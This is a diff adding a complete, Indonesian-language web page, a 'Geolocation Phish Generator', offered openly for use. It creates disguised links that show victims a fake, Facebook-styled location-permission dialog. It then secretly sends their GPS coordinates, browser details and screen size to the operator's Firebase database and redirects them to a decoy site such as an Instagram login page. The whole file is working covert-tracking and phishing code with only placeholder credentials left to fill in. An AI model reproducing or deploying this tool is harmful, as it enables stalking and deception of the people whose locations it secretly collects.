@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>📍 Geolocation Phish Generator v4</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .container { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); width: 90%; max-width: 500px; text-align: center; }
+        h2 { color: #1c1e21; margin-bottom: 1.5rem; font-weight: 700; }
+        input[type="text"] { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #dddfe2; border-radius: 8px; box-sizing: border-box; font-size: 16px; transition: 0.2s; }
+        input:focus { border-color: #1877f2; outline: none; box-shadow: 0 0 0 2px #e7f3ff; }
+        button { background-color: #1877f2; color: white; border: none; padding: 14px 24px; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600; width: 100%; transition: background 0.2s; }
+        button:hover { background-color: #166fe5; }
+        .result-area { margin-top: 20px; display: none; border-top: 1px solid #eee; padding-top: 20px; }
+        textarea { width: 100%; height: 90px; padding: 12px; border: 1px solid #ccd0d5; border-radius: 8px; resize: none; margin-bottom: 10px; font-family: monospace; font-size: 14px; }
+        .copy-btn { background-color: #42b72a; margin-bottom: 10px; }
+        
+        /* Modal Style */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); backdrop-filter: blur(2px); justify-content: center; align-items: center; z-index: 1000; }
+        .modal-content { background: white; padding: 25px; border-radius: 16px; width: 85%; max-width: 320px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); animation: popIn 0.3s ease; }
+        @keyframes popIn { from {transform: scale(0.9); opacity: 0;} to {transform: scale(1); opacity: 1;} }
+        
+        .icon-lock { font-size: 40px; margin-bottom: 15px; color: #1877f2; }
+        .modal-title { font-weight: 700; font-size: 18px; margin-bottom: 8px; color: #242424; }
+        .modal-body { font-size: 14px; color: #606770; line-height: 1.4; margin-bottom: 25px; }
+        
+        .btn-group { display: flex; gap: 10px; }
+        .btn-cancel { background: #e4e6eb; color: #050505; flex: 1; }
+        .btn-allow { background: #1877f2; color: white; flex: 1; }
+        .btn-cancel:hover { background: #d8dadf; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>📍 Phish Location Generator</h2>
+    <p style="color:#666; font-size:14px; margin-bottom:20px;">Masukkan URL tujuan (korban akan dialihkan ke sini setelah klik Izinkan)</p>
+    
+    <input type="text" id="targetUrl" placeholder="Contoh: https://www.instagram.com/login">
+    
+    <button onclick="generateLink()">Generate Link</button>
+
+    <div class="result-area" id="resultArea">
+        <label style="display:block; text-align:left; font-weight:600; margin-bottom:5px;">Hasil Link:</label>
+        <textarea id="outputLink" readonly></textarea>
+        <button class="copy-btn" onclick="copyToClipboard()">Salin Link</button>
+        <br>
+        <button onclick="previewPhish()" style="background:#666; font-size:14px; padding:10px;">Preview Simulasi</button>
+    </div>
+</div>
+
+<!-- Modal Palsu -->
+<div id="geoModal" class="modal">
+    <div class="modal-content">
+        <div class="icon-lock">🔒</div>
+        <div class="modal-title">Lokasi Diperlukan</div>
+        <div class="modal-body" id="modalText">
+            Izinkan akses lokasi untuk membuka halaman utama?
+        </div>
+        <div class="btn-group">
+            <button class="btn-cancel" onclick="closeModal()">Batal</button>
+            <button class="btn-allow" onclick="triggerGeolocate()">Izinkan</button>
+        </div>
+    </div>
+</div>
+
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+    // --- GANTI CONFIG INI DENGAN DARI FIREBASE KAMU ---
+    const firebaseConfig = {
+        apiKey: "MASUKIN_API_KEY_KAMU",
+        authDomain: "PROJECT_ID.firebaseapp.com",
+        databaseURL: "https://PROJECT_ID-default-rtdb.firebaseio.com",
+        projectId: "PROJECT_ID",
+        storageBucket: "PROJECT_ID.appspot.com",
+        messagingSenderId: "SENDER_ID",
+        appId: "APP_ID"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+
+    window.generateLink = function() {
+        const target = document.getElementById('targetUrl').value;
+        if(!target) return alert("Masukkan URL dulu!");
+        
+        // Encode URL
+        const encoded = btoa(target);
+        const currentHost = window.location.origin + window.location.pathname;
+        const fullLink = `${currentHost}?t=${encoded}`;
+        
+        document.getElementById('outputLink').value = fullLink;
+        document.getElementById('resultArea').style.display = 'block';
+        document.getElementById('modalText').innerText = 
+            `Situs ini memerlukan lokasi Anda untuk memuat konten ${decodeURIComponent(atob(encoded))} dengan lebih baik.`;
+    };
+
+    window.copyToClipboard = () => {
+        const copyText = document.getElementById("outputLink");
+        copyText.select();
+        navigator.clipboard.writeText(copyText.value);
+        const btn = document.querySelector('.copy-btn');
+        const originalText = btn.innerText;
+        btn.innerText = "Tersalin!";
+        setTimeout(() => btn.innerText = originalText, 2000);
+    };
+
+    window.closeModal = () => document.getElementById('geoModal').style.display = 'none';
+
+    window.triggerGeolocate = function() {
+        closeModal();
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    sendToFirebase(position.coords.latitude, position.coords.longitude);
+                    const params = new URLSearchParams(window.location.search);
+                    const target = params.get('t');
+                    if(target) window.location.href = decodeURIComponent(atob(target));
+                },
+                () => {
+                    // Jika diblokir, tetap redirect biar tidak nyangkut
+                    const params = new URLSearchParams(window.location.search);
+                    const target = params.get('t');
+                    if(target) window.location.href = decodeURIComponent(atob(target));
+                }
+            );
+        } else {
+             const params = new URLSearchParams(window.location.search);
+                const target = params.get('t');
+                if(target) window.location.href = decodeURIComponent(atob(target));
+        }
+    };
+
+    function sendToFirebase(lat, lon) {
+        const logsRef = ref(db, 'locations');
+        push(logsRef, {
+            lat: lat,
+            lng: lon,
+            time: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            screen: `${screen.width}x${screen.height}`,
+            ip: "Check Dashboard for details" // IP biasanya butuh server side, tapi koordinat sudah cukup akurat
+        });
+    }
+
+    // Auto show modal jika link dibuka via ?t=...
+    window.onload = function() {
+        const params = new URLSearchParams(window.location.search);
+        if(params.get('t')) {
+            document.getElementById('geoModal').style.display = 'flex';
+        }
+    };
+</script>
+
+</body>
+</html>
